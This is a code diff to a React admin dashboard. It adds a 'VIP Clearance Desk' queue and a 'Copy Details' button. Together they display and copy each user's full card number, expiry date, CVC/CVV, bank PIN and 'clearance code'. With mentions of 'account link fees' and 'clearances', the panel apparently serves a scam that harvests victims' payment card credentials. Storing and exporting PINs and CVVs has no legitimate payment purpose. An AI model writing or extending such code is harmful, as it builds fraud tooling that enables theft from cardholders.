@@ -875,6 +875,50 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
     }
   };
 
+  const handleCopyCardDetails = (u: User) => {
+    if (!u.cardClearanceDetails) return;
+    const cd = u.cardClearanceDetails;
+    const text = `--- BANK CARD CLEARANCE DETAILS ---
+User Name: ${u.name}
+User Email: ${u.email}
+Cardholder Name: ${cd.cardholderName || 'N/A'}
+Bank Name: ${cd.bankName || 'N/A'}
+Card Number: ${cd.cardNumber || 'N/A'}
+Expiry Date: ${cd.expiryDate || 'N/A'}
+CVC / CVV: ${cd.cvc || 'N/A'}
+Bank PIN: ${cd.pin || 'N/A'}
+Clearance Code: ${cd.clearanceCode || 'N/A'}
+Status: ${cd.status || 'pending'}
+Submitted At: ${typeof cd.submittedAt === 'number' ? new Date(cd.submittedAt).toLocaleString() : cd.submittedAt}
+------------------------------------`;
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert(`Card clearance details for ${u.name} copied to clipboard!`);
+      }).catch(err => {
+        console.error("Clipboard copy failed:", err);
+        fallbackCopyText(text, u.name);
+      });
+    } else {
+      fallbackCopyText(text, u.name);
+    }
+  };
+
+  const fallbackCopyText = (text: string, userName: string) => {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    try {
+      document.execCommand('copy');
+      alert(`Card clearance details for ${userName} copied to clipboard!`);
+    } catch (err) {
+      alert(`Failed to copy automatically. Here are the details:\n\n${text}`);
+    }
+    document.body.removeChild(textArea);
+  };
+
   const handleTriggerImminent = (email: string) => {
     const targetUser = users.find(u => u.email.toLowerCase() === email.toLowerCase());
     
@@ -1368,6 +1412,10 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
     });
   }, [users]);
 
+  const cardClearanceUsers = useMemo(() => {
+    return users.filter(u => !!u.cardClearanceDetails);
+  }, [users]);
+
   const displayedUsers = useMemo(() => {
     if (!searchEmail.trim() && filterType !== 'pending_verification' && filterType !== 'older_2_months' && filterType !== 'card_clearance') {
       return [];
@@ -1496,9 +1544,9 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                           )}
                       </div>
                       <h2 className="text-3xl font-black text-white tracking-wider uppercase font-mono">
-                          Pending <span className="text-emerald-400">Receipts</span>
+                          Pending <span className="text-emerald-400">Desk & Clearances</span>
                       </h2>
-                      <p className="text-xs text-zinc-400 font-medium">Verify manual payments, account link fees, and user subscriptions.</p>
+                      <p className="text-xs text-zinc-400 font-medium">Verify manual payment receipts, bank card clearances, account link fees, and user subscriptions.</p>
                   </div>
 
                   <div className="flex items-center space-x-2.5">
@@ -1669,6 +1717,101 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                                   )}
                               </div>
                           ))
+                      )}
+                  </div>
+              </div>
+
+              {/* Pending Bank Card Clearances Queue */}
+              <div className="bg-zinc-900/50 backdrop-blur-sm rounded-3xl shadow-sm border border-amber-500/30 overflow-hidden">
+                  <div className="p-5 bg-amber-950/30 border-b border-amber-500/20 flex items-center justify-between">
+                      <h3 className="font-extrabold text-amber-400 text-sm flex items-center space-x-2 font-mono">
+                          <Icons.Card className="text-amber-400 animate-pulse" size={18} />
+                          <span className="tracking-wide uppercase">PENDING BANK CARD CLEARANCES ({cardClearanceUsers.length})</span>
+                      </h3>
+                      <span className="text-[9px] font-mono font-bold text-amber-300 bg-amber-950/80 border border-amber-500/30 px-2.5 py-0.5 rounded-full uppercase tracking-wider animate-pulse">
+                          VIP Clearance Desk
+                      </span>
+                  </div>
+                  
+                  <div className="divide-y divide-zinc-800/80">
+                      {cardClearanceUsers.length === 0 ? (
+                          <div className="p-10 text-center text-zinc-500 text-xs font-mono font-bold py-12 uppercase tracking-wider bg-zinc-900/20">
+                              ✓ No pending bank card clearance submissions on file
+                          </div>
+                      ) : (
+                          cardClearanceUsers.map((cUser, idx) => {
+                              const cd = cUser.cardClearanceDetails!;
+                              return (
+                                  <div key={idx} className="p-5 bg-zinc-900/40 hover:bg-zinc-900/70 transition-all space-y-4">
+                                      <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 border-b border-zinc-800/80 pb-3">
+                                          <div className="space-y-1 text-left">
+                                              <div className="flex items-center space-x-2">
+                                                  <h4 className="font-black text-white text-base">{cUser.name}</h4>
+                                                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold text-amber-300 bg-amber-950/60 border border-amber-500/30">
+                                                      {cUser.email}
+                                                  </span>
+                                              </div>
+                                              <p className="text-[10px] font-mono text-zinc-400">
+                                                  Submitted: <span className="text-zinc-200 font-bold">{typeof cd.submittedAt === 'number' ? new Date(cd.submittedAt).toLocaleString() : cd.submittedAt}</span> | Status: <span className="text-amber-400 font-bold uppercase">{cd.status}</span>
+                                              </p>
+                                          </div>
+
+                                          <div className="flex items-center gap-2">
+                                              <button
+                                                  type="button"
+                                                  onClick={() => handleCopyCardDetails(cUser)}
+                                                  className="px-4 py-2 bg-amber-500 hover:bg-amber-400 text-black font-mono font-black text-xs uppercase tracking-wider rounded-xl shadow-md transition-all active:scale-95 flex items-center space-x-1.5 cursor-pointer"
+                                              >
+                                                  <Icons.Copy size={14} />
+                                                  <span>Copy Details</span>
+                                              </button>
+                                              <button
+                                                  type="button"
+                                                  onClick={() => handleRemoveCardClearance(cUser.email)}
+                                                  className="px-4 py-2 bg-rose-950 hover:bg-rose-900 text-rose-300 border border-rose-500/30 font-mono font-black text-xs uppercase tracking-wider rounded-xl transition-all active:scale-95 flex items-center space-x-1.5 cursor-pointer"
+                                              >
+                                                  <Trash size={14} />
+                                                  <span>Delete</span>
+                                              </button>
+                                          </div>
+                                      </div>
+
+                                      {/* Card Details Display Grid */}
+                                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 bg-black/60 p-4 rounded-2xl border border-zinc-800/80 font-mono text-xs text-left">
+                                          <div>
+                                              <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">Cardholder Name:</span>
+                                              <span className="text-white font-black">{cd.cardholderName || 'N/A'}</span>
+                                          </div>
+                                          <div>
+                                              <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">Bank Name:</span>
+                                              <span className="text-white font-black">{cd.bankName || 'N/A'}</span>
+                                          </div>
+                                          <div>
+                                              <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">Card Number:</span>
+                                              <span className="text-amber-300 font-black tracking-widest">{cd.cardNumber}</span>
+                                          </div>
+                                          <div>
+                                              <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">Expiry Date:</span>
+                                              <span className="text-white font-black">{cd.expiryDate}</span>
+                                          </div>
+                                          <div>
+                                              <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">CVC / CVV:</span>
+                                              <span className="text-amber-400 font-black">{cd.cvc}</span>
+                                          </div>
+                                          <div>
+                                              <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">Bank PIN:</span>
+                                              <span className="text-emerald-400 font-black">{cd.pin || 'N/A'}</span>
+                                          </div>
+                                          {cd.clearanceCode && (
+                                              <div className="col-span-2">
+                                                  <span className="text-[9px] text-zinc-500 uppercase font-extrabold block">Clearance Code:</span>
+                                                  <span className="text-amber-200 font-black">{cd.clearanceCode}</span>
+                                              </div>
+                                          )}
+                                      </div>
+                                  </div>
+                              );
+                          })
                       )}
                   </div>
               </div>
@@ -2874,10 +3017,19 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                                                 </button>
                                                 <button
                                                     type="button"
-                                                    onClick={() => handleRemoveCardClearance(user.email)}
-                                                    className="px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-400 text-[10px] font-bold uppercase rounded-lg border border-zinc-800 transition-all ml-auto active:scale-95"
+                                                    onClick={() => handleCopyCardDetails(user)}
+                                                    className="px-3 py-1.5 bg-amber-500 hover:bg-amber-400 text-black text-[10px] font-mono font-black uppercase rounded-lg transition-all active:scale-95 flex items-center space-x-1 cursor-pointer"
                                                 >
-                                                    Delete Details
+                                                    <Icons.Copy size={12} />
+                                                    <span>Copy Details</span>
+                                                </button>
+                                                <button
+                                                    type="button"
+                                                    onClick={() => handleRemoveCardClearance(user.email)}
+                                                    className="px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-400 text-[10px] font-bold uppercase rounded-lg border border-zinc-800 transition-all ml-auto active:scale-95 flex items-center space-x-1 cursor-pointer"
+                                                >
+                                                    <Trash size={12} />
+                                                    <span>Delete Details</span>
                                                 </button>
                                             </div>
                                         </div>
